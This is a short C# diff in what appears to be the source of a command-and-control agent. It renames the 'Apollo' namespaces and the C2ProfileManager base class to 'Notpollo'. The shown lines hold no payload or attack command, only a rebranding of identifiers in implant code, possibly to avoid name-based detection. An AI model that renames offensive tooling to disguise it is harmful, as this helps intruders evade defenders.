@@ -1,14 +1,14 @@
-﻿using ApolloInterop.Interfaces;
-using ApolloInterop.Serializers;
+﻿using NotpolloInterop.Interfaces;
+using NotpolloInterop.Serializers;
 using HttpTransport;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 
-namespace Apollo.Management.C2
+namespace Notpollo.Management.C2
 {
-    public class C2ProfileManager : ApolloInterop.Classes.C2ProfileManager
+    public class C2ProfileManager : NotpolloInterop.Classes.C2ProfileManager
     {
         public C2ProfileManager(IAgent agent) : base(agent)
         {
